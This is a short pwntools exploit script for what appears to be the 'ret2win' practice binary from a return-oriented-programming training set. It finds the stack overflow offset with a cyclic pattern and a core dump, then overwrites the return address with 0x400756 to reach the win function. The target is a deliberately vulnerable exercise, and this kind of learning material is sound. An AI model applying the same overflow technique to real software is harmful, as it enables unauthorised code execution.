from pwn import *

#
# Context
#

e = context.binary = ELF('ret2win')

#
# ROP
#

target = p64(0x00400756)

#
# Find Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x38))
io.wait()

core = io.corefile
offset = cyclic_find(core.read(core.rsp, 4))

io.close()

info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += target

io = process(e.path)
io.sendlineafter(b'> ', payload)

info(io.recvall().decode())

io.close()